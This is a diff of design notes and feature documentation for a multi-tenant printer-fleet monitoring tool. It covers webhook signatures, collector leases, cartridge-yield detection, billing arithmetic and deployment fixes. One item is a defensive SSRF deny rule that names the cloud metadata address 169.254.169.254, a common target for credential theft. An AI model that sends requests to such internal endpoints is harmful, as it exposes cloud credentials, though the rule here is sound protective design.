+  — FreeScout stays the ticket path — so this is how an MSP wires Printer Nanny
+  into their own ERP, procurement or automation: a small set of documented,
+  versioned event types rather than Printer Nanny growing a model of their
+  business. Four rules that must not regress:
+  - **The signature is Stripe's scheme, not GitHub's**:
+    `t=<unix>,v1=<hex>` over `b"<t>." + <the exact request body bytes>`. HMAC
+    over the body alone proves only that someone held the secret, so a captured
+    request stays valid **forever**; and a timestamp in a *separate* header is
+    freely rewritten because the MAC does not cover it. Putting `t` inside the
+    signed material binds the body to a moment. `v1=` is a label rather than a
+    fixed name, so a future `v2=` ships **alongside** it and consumers migrate
+    one at a time. It is also the most widely implemented webhook signature
+    there is, which matters more than elegance: the property is only real if the
+    consumer actually verifies, and the cheapest verification is the one they
+    have already written.
+  - **Tenancy is checked twice** — at fan-out and again immediately before send
+    — because a subscription's scope is editable, and re-scoping a global
+    subscription would otherwise ship other tenants' already-queued events.
+  - **SSRF has two tiers, and only one is overridable.** Link-local (including
+    `169.254.169.254`), unspecified, multicast and reserved are refused with
+    **no override**; loopback / private / CGNAT are refused by default but
+    settable, because the likeliest subscriber is the MSP's own box on the same
+    LAN and a blanket refusal just gets worked around. Redirects are never
+    followed.
+  - Payloads carry **no secrets and no unescaped device strings** — every value
+    passes the catalogue's one normalisation on the way in.
+- **Collector redundancy is a lease, and split brain is the entire problem**
+  (`central/collector.py`, `subnets.collector_agent_id` /
+  `collector_lease_expires_at`). PrintFleet publishes that 10-20% of collectors
+  stop working at some point, and before this a dead site agent just meant
+  frozen data. Two collectors sweeping one subnet is **not** a cosmetic
+  duplicate: billing sums *positive* page-count deltas over readings ordered by
+  an agent-stamped `ts`, so two collectors with a few seconds of clock skew
+  produce 100, 110, 105, 110 — and every recovery re-charges pages already
+  billed. Measured, not asserted: 20 billed pages where the truth is 10. Three
+  layers, and each covers something the others cannot:
+  - **Ownership changes only through a single-row conditional UPDATE** whose
+    WHERE states what the row must still look like, with **rowcount as the
+    interlock** — the same discipline as the single-use claim code, never
+    read-then-write. That alone gives at most one holder *per central*.
+  - **The holder enforces its own expiry**, because central's answer only binds
+    an agent that can hear it — and an agent that loses central while still
+    reaching printers keeps polling **by design** (`runner.TargetCache` exists
+    precisely so an outage does not punch a hole in the meters). The agent
+    anchors on `time.monotonic()` sampled **before** it sends the heartbeat and
+    treats the grant as expiring at that instant + `lease_seconds`; central sets
+    the row's expiry at *its* now + `lease_seconds`, which is necessarily later
+    because the request had to travel. So agent deadline ≤ central expiry,
+    always, with **no assumption that the two clocks agree** — each measures a
+    duration on its own.
+  - **Ingest refuses a reading from a non-holder** (`admits()`), which is what
+    protects the append-only table from an agent too old to know what a lease
+    is, a hand-rolled client with a stolen key, and any future bug above it. One
+    exception: the immediate predecessor replaying its spool for the period it
+    *did* hold the lease, because those readings are strictly older history and
+    dropping them punches the very hole the spool exists to prevent.
+  - **Only the worker moves a lease between agents.** A heartbeat may renew its
+    own or pick up one nobody holds, never take one — so no amount of agent-side
+    eagerness displaces anybody. The worker's write is a compare-and-swap
+    re-asserting holder *and* expiry, because every check it made is stale by
+    write time: a slow primary renews, the CAS misses, nothing moves. And the
+    holder must **look gone** — offline *and* silent for
+    `collector.takeover_after_seconds`, deliberately longer than the offline
+    grace, so "briefly missed a heartbeat" and "stopped working" stay different
+    events. Same conservatism as `services.adopt_by_name`.
 - **Checkbox booleans need a presence marker.** An unchecked box posts nothing,
   so a handler that ignores empty fields (`subnet_update`) cannot tell "unchecked"
   from "this form didn't carry the field" — reading it directly makes an inline
   rename silently clear the flag. `trusted` pairs with a hidden `trusted_present`;
   `runtime.save_settings` solves the same problem with its `sections` argument.
   Same failure class as the `save_settings(sections=None)` wipe.
+- **Yield-gap detection measures a cartridge, and the finding is an accusation**
+  (`central/supply_yield.py`, `supply_cycles`, `supply_yield_expectations`,
+  `/supplies/yield`). A persistent shortfall in pages-per-cartridge is the
+  non-OEM / refill signal, and a false positive tells an MSP their customer buys
+  grey-market consumables. Everything below follows from that asymmetry:
+  - **A cartridge change is a level that RISES**, LibreNMS's cheap trick, and the
+    only signal a printer gives. That test is `supplies.refill_boundaries`,
+    shared verbatim with the depletion forecast — which needs the *last*
+    boundary where this needs *every* one. Two copies could disagree about where
+    a cartridge started and credit its pages to its predecessor, with nothing
+    anywhere reporting it.
+  - **Persist the measurement, compute the judgement**, the same split as
+    `reorder.py`. A cycle cannot be recomputed once its raw readings age out (a
+    drum outlives the 90-day window), so it is a row; the verdict is derived on
+    read, so a threshold change lands on the next render and there is no stale
+    verdict to reconcile when a cartridge is swapped.
+  - **A day is read from exactly one source, and never from none.** Rollups
+    below `retention.effective_raw_days`, raw readings above it — *plus* raw
+    readings below it for days no rollup covers, because deletion ships OFF and
+    the rollup pass works forward from a watermark a bounded number of
+    printer-days per cycle. Reading only rollups there discarded real history
+    silently: the cartridges with the most history were measured over the least
+    of it. Found by the end-to-end smoke, invisible to every unit test above it.
+  - **Expected yield has two sources and states which one it used.** An
+    operator's datasheet figure per model tag beats a fleet-derived MEDIAN
+    across *other* printers of the same model. The subject is excluded from its
+    own baseline, or a printer running non-OEM calibrates the expectation to
+    itself. The baseline's weakness is stated in the UI rather than buried: a
+    fleet where every unit of a model runs non-OEM calibrates to non-OEM and
+    finds nothing.
+  - **Absence is neither a finding nor a clean bill of health.** Under
+    `yield.min_cycles` (3) completed cartridges the row reads *insufficient
+    data* and shows the measurement without a verdict; with no expectation it
+    reads *no expected yield*, never *within expected*. Same correction the
+    security-posture report needed. Thresholds are clamped on read, so a
+    hand-edited `app_settings` row cannot turn one cartridge into a finding.
+  - **The replacement log is deliberately NOT written to `printer_events`.**
+    That table is the counting source for occurrence-rate rules, and a rule
+    matching everything above a severity would start counting toner changes as
+    printer faults — a new feature silently changing an existing one's numbers.
+  - Staff-only, like `/security/posture` and for the same reason: every useful
+    response to a shortfall is an MSP conversation, not a self-service page.
+- **Money is `Decimal` end to end, and `Numeric` alone does not deliver that.**
+  A cost-per-page rate is six decimals and an invoice multiplies it by five-figure
+  page counts, so a float round trip shows up as an invoice whose lines stop
+  adding up to its own total. SQLAlchemy's `Numeric` is exact on Postgres and
+  *not* on SQLite — which is where the whole suite and every dev install run, so
+  the arithmetic would be verified against the wrong storage. `central/money.py`
+  therefore stores NUMERIC on Postgres and a **zero-padded fixed-scale string**
+  on SQLite (padded so text ordering equals numeric ordering), and it overrides
+  `bind_processor`/`result_processor` to stop the impl chain: `Numeric.bind_processor`
+  returns `processors.to_float` on any dialect whose `supports_native_decimal` is
+  False, which is the inherited default on *both* `PGDialect` and `SQLiteDialect`.
+  Neither supported backend reaches that line today; the override is what keeps
+  that from being contingent on a dialect internal nobody re-checks. Two rules
+  come with the SQLite variant: **never SUM/AVG a money column in SQL** (it is
+  text there, and SQLite would coerce to float — all arithmetic happens in Python),
+  and a CHECK on a money column is **vacuous** on SQLite (text always compares
+  greater than a number), so non-negativity is enforced at the parse point instead
+  of pretended in the schema.
+- **The rounding rule is half-up, at the invoice line, once.** Python's default
+  is banker's rounding, which is not what an invoice does or what a customer with
+  a calculator expects. Pages × a six-decimal rate and every graduated band stay
+  at full precision; the single quantization lands on the line amount, and the
+  invoice total is the exact sum of already-rounded lines — so the printed lines
+  always add up to the printed total. Rounding per *page* instead drifts by up to
+  half a cent times the page count: 40,000 pages at 0.0085 bills $400.00 rather
+  than $340.00, a $60 artefact of nothing but the rounding rule.
+- **Billing extends the blank-vs-zero discipline the CSV started.** A meter the
+  device did not report in the period is `None`, never 0 — `queries.period_meters`
+  returns one or the other and the engine has a branch for each. A device
+  reporting mono but not colour is billed for its mono pages only, with the
+  remainder disclosed as *unbilled* on the invoice; a device reporting neither is
+  priced only if the rate card carries an explicit `unsplit_policy` saying so.
+  That policy is a stored operator decision rather than an inference because
+  "colour = 0" is right for a mono laser and catastrophically wrong for an MFP
+  whose colour meter failed to decode — and it deliberately does **not** cover the
+  partial-split case, since pages a device did not call mono are by definition not
+  mono. Period deltas are reset-safe (positive steps only), so a firmware reflash
+  or a replacement device on the same row contributes 0 rather than a large
+  negative that would cancel out a month of real printing.
+- **Volume bands are graduated, and at most one rate card per client is active.**
+  Marginal bands (each covering only the pages between the previous ceiling and
+  its own, with the card's base rate above the highest) rather than
+  whole-volume-at-the-qualifying-rate, because the latter is non-monotonic —
+  printing one more page can lower the bill — and an invoice nobody can explain is
+  worse than one that is slightly less generous. It also removes the unbounded
+  tier row somebody would eventually forget to add. The single active card is a
+  **partial unique index**, not a convention: with two, "which card produced this
+  invoice" has no answer and the rates depend on row order.
 
 ## Dev
 - `pip install -e ".[dev]"` (add `postgres` / `agent` / `agent-mdns` extras as needed).
@@ -550,10 +1135,22 @@ no network. An unresolvable central killed the process, launchd respawned it eve
 60s, and the log grew **9.8 MB/day** of tracebacks naming no reason. Moving the
 call inside the loop costs nothing (once enrolled it makes no request) and drops
 that to ~44 KB/day of one stated line per interval. A refused *key* still
-re-raises, because terminal is not transient. Note the trap left behind:
+re-raises, because terminal is not transient. That left a trap, now **closed**:
 `workstation_cli` returns exit 2 for a refused key specifically so a service
 manager will not loop — but the plist's `KeepAlive{SuccessfulExit=false}` restarts
-on any non-zero exit, so on macOS it loops anyway.
+on any non-zero exit, and launchd cannot express "restart unless the exit code is
+2", so the comment described a behaviour that did not happen. Resolved with a
+**refused-key sentinel** rather than by weakening the exit code: the first
+refusal still exits 2 and records a SHA-256 of the key (never the key) beside
+`machine.json`; a second start carrying that same key logs the reason and exits
+0, so launchd restarts exactly once and stops. It clears itself when the key
+changes — re-minting is the actual fix, so the fix is the reset and no operator
+need know the file exists — and expires after 6h so a key central *un-revokes*
+server-side is not permanently poisoned by an unchanged fingerprint. A corrupt
+sentinel fails open, and `--once` neither reads nor writes it, because a
+diagnostic run must give the real answer rather than a cached one. Our half is
+unit-tested; **launchd's half is not, and needs the Mac** — a restart gets
+counted, not inferred (`deploy/HARDWARE-VERIFICATION.md` Part 3).
 
 **And a page came out**, which is the one item nothing else substitutes for: a
 Brother MFC-L8900CDW, on a queue the root daemon provisioned, with a PPD CUPS
@@ -745,7 +1342,8 @@ launchd *requires* the plist to be world-readable, so the key lives in a 0600
 `tests/test_macos_deployment.py` asserts that against both the reviewable plist
 and the one the installer generates, since they are two files and only one ships.
 
-**On Windows that rule is only half-applied, and the missing half undoes it.**
+**On Windows that rule was only half-applied, and the missing half undid it —
+now fixed; the paragraph below is the diagnosis, not the current state.**
 Verified on a real install 2026-07-30: the MSI lays `workstation.toml` down in
 `C:\Program Files\Printer Nanny\Workstation\` and sets **no ACL at all** — no
 `LockPermissions`, no `MsiLockPermissionsEx`, no custom action, and
@@ -1116,14 +1714,124 @@ transports, **not** against real tenants.
   into, so `installer` stays manual per `deploy/MACOS-CLIENT-TESTING.md`. The
   signing step is skipped rather than failed where the Apple secrets are absent,
   because a red X for "no Developer account" teaches people to ignore red Xs.
+- **Postgres CI is not path-filtered, and that is deliberate.**
+  `.github/workflows/postgres.yml` runs the whole suite against a real
+  `postgres:16-alpine` (the same major `docker-compose.yml` defaults to —
+  testing a different major answers a different question). Until it existed, CI
+  ran only on SQLite, so every Postgres-only path executed for the first time on
+  a customer's server: the dialect-guarded BRIN index, `pg_try_advisory_lock`
+  leader election (a no-op on SQLite, so the "second worker skips the cycle"
+  contract was never once asserted), `pg_dump`/`pg_restore` (both subprocess
+  seams were monkeypatched away), and real Alembic runs (SQLite migrates under
+  `render_as_batch` and Postgres does not). Writing those tests found **two
+  shipped defects immediately** — a fresh `alembic upgrade head` could not build
+  the schema at all, and the backup path produced a zero-byte file. Linux runner
+  minutes bill at 1×, so the cost discipline behind the Windows (2×) and macOS
+  (10×) filters does not apply; and a filter would be actively **wrong**, since
+  both defects lived in `central/models.py` and
+  `central/dashboard/backup_routes.py` — files no Postgres-shaped path filter
+  would plausibly have listed.
+  - Three test changes that came with it are **findings, not accommodations**,
+    and are the shape to expect when adding coverage on a second dialect:
+    Postgres rejects an integer bound into a Boolean *before* evaluating a
+    CHECK, so a test binding literal `0` passed for entirely the wrong reason;
+    `try_leader_lock`'s SQLite assertions are marked `sqlite_only`, because on
+    Postgres the same call reaches the other branch where reentrancy means the
+    second session is **refused** — asserting True there asserts the opposite of
+    the production contract while looking green; and Postgres runs mark the
+    session cookie `Secure`, so a test hardcoding `http` broke.
+- **The Docker image's dependency layer is projected from `pyproject.toml`, not
+  hand-listed.** The hand-written "fallback" list was never a fallback: with
+  only `pyproject.toml` copied, `pip install ".[postgres]"` dies at *"package
+  directory central does not exist"*, so that list was the **only** path that
+  ever ran — and it had drifted three packages (`authlib`, `cryptography`,
+  `tzdata`) from `pyproject`. What covered for it was the other defect,
+  `pip install -e . || true`, whose discarded failure quietly resolved
+  `[project.dependencies]` anyway. The image was correct exactly as long as a
+  step whose failure is explicitly discarded kept succeeding. Both are gone. The
+  `-e` is **load-bearing and now asserted**: `pip wheel .` yields 53 entries
+  with zero templates and zero static files, so a non-editable install 500s on
+  every page.
 
 **Core**: central server, multi-tenant model, push-based agents, brand-agnostic
-SNMP, alerting with dedupe + auto-resolve + flap damping, quiet hours + maintenance
+SNMP, alerting with dedupe + auto-resolve + flap damping, occurrence-rate rules
+("10 jams a day") with their own hysteresis and a window-capped cooldown, alert
+rule CRUD at `/manage/alert-rules`, quiet hours + maintenance
 windows, scheduled reports, friendly names,
 days-until-order supply forecasts, per-client / per-site rollups, recent
-activity, maintenance schedules, audit log, DB backup/restore, one-screen
-onboarding (claim-code self-enrollment, trusted-subnet auto-approve, bulk
-approvals, per-client defaults).
+activity, **fleet-wide printer search** (IP / hostname / serial / asset tag /
+model / brand / display name, tenant-scoped **in the WHERE**, `ilike` because
+Postgres `LIKE` is case-sensitive and SQLite's is not — a plain `.like()` passes
+every SQLite run and fails in production), maintenance schedules, audit log, DB
+backup/restore, one-screen onboarding (claim-code self-enrollment,
+trusted-subnet auto-approve, bulk approvals, per-client defaults), **readings
+retention + daily rollup**, and **collector redundancy** (a standby agent per
+subnet behind a lease — see the conventions).
+
+**Supply reorder recommendations** (`/supplies/reorder`, the portal and the
+weekly report): "order these N cartridges", triggered on level **OR**
+days-remaining **OR** pages-remaining, in two urgency bands. **Recommend-only,
+structurally**: the judgement is computed on read from the persisted
+measurements and stored nowhere, so there is no row to go stale, a threshold
+change takes effect on the next render rather than the next worker cycle, and
+"no recommendation exists as a row" is what keeps the boundary from being a
+matter of discipline. No SKU catalogue, no inventory, no PO generation, no order
+state machine — a human places every order, and an `supply.reorder_recommended`
+event lets an MSP's own ERP act on it. If a change starts to need an order
+lifecycle, that is the signal it is out of scope.
+
+**Cartridge yield** (`/supplies/yield`, **staff only**): pages actually
+delivered per cartridge, measured between one replacement and the next, against
+what a cartridge for that model should deliver. A persistent shortfall is the
+non-OEM / refill signal — the one thing an MSP cannot otherwise see, because
+every individual reading looks entirely normal. Replacements are detected from
+the supply level RISING (`supplies.refill_boundaries`, shared with the depletion
+forecast), the interval's pages come from the same rollup-then-raw series
+billing reads, and expected yield comes from an operator-entered datasheet
+figure per model tag or, failing that, the fleet median across *other* printers
+of the same model. Presented as **"yield below expected"** with the non-OEM
+reading offered as an interpretation next to the things that equally explain it;
+the threshold is operator-settable and defaults to a conservative 30% over at
+least 3 completed cartridges. Below that it says *insufficient data* and shows
+the measurement without a verdict. Two opt-in events
+(`supply.replaced`, `supply.yield_below_expected`) let an ERP act on it. See the
+conventions for why absence is reported as itself, why the subject printer is
+excluded from its own baseline, and why nothing lands in `printer_events`.
+
+**Device security posture** (`/security/posture`, **staff only**, with a CSV
+export that enforces the same by 403 rather than by tenant-scoping — an export
+the UI refuses to show is a tenancy hole with a filename). The view itself is
+old; what it *asserts* was corrected, and all three corrections are the same
+shape — **reporting absence as safety**, which is the one thing a security
+report must never do. SNMPv3 was graded secure on the version alone, but USM
+`noAuthNoPriv` is v3 with authentication *and* privacy off and the agent polls
+at exactly that level when no `security_level` is recorded, so an unconfigured
+v3 subnet earned a green "authenticated" badge over a cleartext session; graded
+three ways now (cleartext / authenticated / encrypted). It flagged every v1/v2c
+device "insecure-snmp" in red, which is not a claim we can support — we never
+attempt a SET, and HP's Secure by Default refuses writes while answering reads,
+so a technician sent to a hardened printer finds nothing and stops believing the
+next report; narrowed to `snmp-cleartext`, which says only what we own. And
+`firmware-unknown` was counted in `flagged` beside real exposures — "we cannot
+see this" and "this is exposed" are different claims, and merging them is how a
+security report becomes noise; it is a visibility column with its own counter
+now. The one genuinely assertable credential finding needs no inference about
+the device at all: `snmp-default-community`, raised when the community in *our
+own* subnet row is still a vendor default (v1/v2c only — a leftover `public` on
+a v3 subnet is a credential nothing uses). The community string is **never a
+column**: "is it a default" is the finding, the value is a live credential, and
+this file gets mailed around.
+
+**Billing** (`/manage/billing`, admin-only — a rate card is a customer's
+commercial terms, not fleet operations): per-client cost-per-page rate cards with
+mono/colour rates, optional graduated volume bands and an optional monthly
+minimum, priced over the reading series into invoice-shaped output (preview +
+CSV, both audited). Invoices are **derived on demand, never stored** — the meters
+are append-only and the card records the terms, so a stored copy is a second
+source of truth that drifts the moment a rate is corrected, and doing it honestly
+would mean immutability, a numbering series and credit notes. The monthly billing
+CSV carries `pages_period`/`mono_period`/`color_period` **beside** the untouched
+lifetime meters, over the last complete calendar month.
 
 **Channels**: email (incl. OAuth SMTP / XOAUTH2), Slack, Teams, FreeScout,
 generic webhook. Attachments supported on email for reports.
@@ -1136,6 +1844,17 @@ generic webhook. Attachments supported on email for reports.
 - **Xerox**, **Kyocera**, **Canon**, **Ricoh**, **Konica Minolta** — defensive
   scaffolding (brand tag + front-panel message). Exact private-MIB supply
   decoding extended per-model when a probe lands.
+
+**Device definitions** (`/manage/definitions`): server-pushed, so a new model no
+longer needs an agent release. Definitions are validated data — no regex, closed
+vocabulary, bounded — served over the existing agent API, signed against the
+requesting agent's own credential, cached locally, and applied by a provider that
+runs **after** every built-in and fills only what is missing. See the conventions
+above for the precedence decision and why the feed is a full set rather than a
+delta. Verified end-to-end against a fake SNMP backend on a freshly seeded DB:
+the same agent build reports a `-3` "some remaining" bucket before the row exists
+and a real 47% after it, with the trace naming the definition on the printer's
+detail page.
 
 **Discovery**: SNMP sweep across configured subnets + optional mDNS / Bonjour
 (zeroconf, `agent[mdns]` extras) on the agent's local subnet.
